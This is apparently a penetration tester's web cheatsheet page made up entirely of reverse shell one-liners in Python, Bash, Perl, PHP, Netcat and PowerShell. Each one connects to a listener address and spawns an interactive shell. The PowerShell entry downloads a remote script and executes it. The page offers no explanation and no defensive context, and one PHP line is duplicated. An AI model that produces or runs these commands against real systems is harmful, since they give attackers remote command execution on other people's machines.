---
layout: cheatsheet
title: "Sh"
---

Python:
<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace;">
  <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' </code>
</div>

Bash:
<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace;">
  <code>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 </code>
  <code>bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1" </code>
</div>


Perl:
<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace;">
  <code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' </code>
</div>

PHP:
<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace;">
  <code><?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?> </code>
  <code><?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?> </code>
</div>

Netcat:
<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace;">
  <code>nc -e /bin/sh 10.0.0.1 1234 </code>
  <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.218 1234 >/tmp/f </code>
</div>

Powershell:
<div style="background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; display: inline-block; font-family: 'Courier New', Courier, monospace;">
  <code>powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.235:1337/Invoke-PowerShellTcp.ps1\")" </code>
</div>
